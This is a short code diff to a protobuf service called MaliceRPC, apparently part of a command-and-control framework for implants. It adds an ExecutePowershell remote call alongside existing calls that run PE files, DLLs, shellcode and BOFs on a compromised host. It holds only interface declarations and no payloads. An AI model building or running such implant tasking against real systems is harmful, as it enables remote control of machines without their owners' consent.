@@ -66,6 +66,7 @@ service MaliceRPC {
   rpc ExecutePE(implantpb.ExecutePE) returns (clientpb.Task);
   rpc ExecuteDLL(implantpb.ExecutePE) returns (clientpb.Task);
   rpc ExecuteShellcode(implantpb.ExecuteShellcode) returns (clientpb.Task);
+  rpc ExecutePowershell(implantpb.ExecutePowershell) returns (clientpb.Task);
   rpc ExecuteBof(implantpb.ExecuteBof) returns (clientpb.Task);
 
   // listener
